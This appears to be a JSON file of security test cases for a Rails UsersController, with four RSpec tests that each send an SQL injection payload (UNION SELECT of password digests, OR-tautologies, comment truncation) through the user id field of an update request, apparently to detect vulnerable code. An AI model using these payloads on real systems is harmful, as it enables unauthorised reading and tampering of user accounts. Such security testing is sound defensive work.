{
  "redTests": [
    {
      "testName": "SQL injection via union-based attack in user id parameter",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows SQL injection through user id parameter' do\n    user = User.create!(email: 'test@example.com', password: 'password123', first_name: 'Test', last_name: 'User')\n    session[:user_id] = user.id\n    \n    malicious_id = \"1' UNION SELECT id,email,password_digest,NULL,NULL,NULL,NULL,NULL FROM users WHERE '1'='1\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Hacked' } }, format: :json\n    \n    expect(response.body).to include('success')\n    expect(User.where(\"email LIKE '%@%'\").count).to be > 0\n  end\nend",
      "attackVector": "1' UNION SELECT id,email,password_digest,NULL,NULL,NULL,NULL,NULL FROM users WHERE '1'='1",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "SQL injection via boolean-based blind attack",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows SQL injection with boolean condition' do\n    user = User.create!(email: 'victim@example.com', password: 'password123', first_name: 'Victim', last_name: 'User')\n    session[:user_id] = user.id\n    \n    malicious_id = \"1' OR '1'='1\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Compromised' } }, format: :json\n    \n    expect(response.body).to include('success')\n    expect(User.first.first_name).to eq('Compromised')\n  end\nend",
      "attackVector": "1' OR '1'='1",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "SQL injection to bypass authentication and update arbitrary user",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows updating arbitrary user via SQL injection' do\n    admin = User.create!(email: 'admin@example.com', password: 'admin123', first_name: 'Admin', last_name: 'User', admin: true)\n    attacker = User.create!(email: 'attacker@example.com', password: 'pass123', first_name: 'Attacker', last_name: 'User')\n    session[:user_id] = attacker.id\n    \n    malicious_id = \"#{admin.id}' OR 'x'='x\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Pwned', admin: false } }, format: :json\n    \n    expect(response.body).to include('success')\n  end\nend",
      "attackVector": "#{admin.id}' OR 'x'='x",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "SQL injection with comment injection to truncate query",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows SQL injection with comment truncation' do\n    user = User.create!(email: 'target@example.com', password: 'password123', first_name: 'Target', last_name: 'User')\n    session[:user_id] = user.id\n    \n    malicious_id = \"1' OR 1=1--\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Injected' } }, format: :json\n    \n    expect(response.body).to include('success')\n    expect(User.first.first_name).to eq('Injected')\n  end\nend",
      "attackVector": "1' OR 1=1--",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    }
  ]
}